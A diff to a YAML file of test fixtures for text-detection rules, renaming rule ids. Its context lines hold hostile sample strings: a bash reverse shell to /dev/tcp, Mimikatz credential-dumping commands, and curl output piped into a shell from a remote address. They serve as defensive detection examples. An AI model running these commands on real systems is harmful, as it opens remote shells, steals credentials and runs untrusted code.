@@ -1,5 +1,5 @@
 # Test fixtures only: the shipped corpus lives in content/mentions/ and is maintained separately.
-- id: mention.test.dev-tcp-redirect
+- id: mention.test_dev_tcp_redirect
   title: Shell redirection to /dev/tcp
   match: {literal: ["/dev/tcp/", "/dev/udp/"]}
   case_sensitive: true
@@ -12,7 +12,7 @@
     positive: ["bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"]
     negative: ["opened /dev/tty1 for login"]
 
-- id: mention.test.mimikatz
+- id: mention.test_mimikatz
   title: Mimikatz named in text
   match: {literal: ["mimikatz", "sekurlsa::logonpasswords"]}
   case_sensitive: false
@@ -25,7 +25,7 @@
     positive: ["C:\\Temp\\MimiKatz.exe privilege::debug", "SEKURLSA::LogonPasswords full"]
     negative: ["mimic katz"]
 
-- id: mention.test.curl-pipe-shell
+- id: mention.test_curl_pipe_shell
   title: Download piped to a shell
   match: {anchored: "curl [^|]{0,200}\\| ?(?:ba)?sh\\b"}
   case_sensitive: false
@@ -38,7 +38,7 @@
     positive: ["CMD (curl -fsSL http://203.0.113.7/x.sh | bash)", "curl http://x/y|sh"]
     negative: ["curl -o /tmp/file http://x/y", "curl http://x/y | shasum"]
 
-- id: mention.test.cron-wget
+- id: mention.test_cron_wget
   title: Cron line that starts with wget
   match: {anchored: "^wget\\s+\\S+"}
   case_sensitive: true
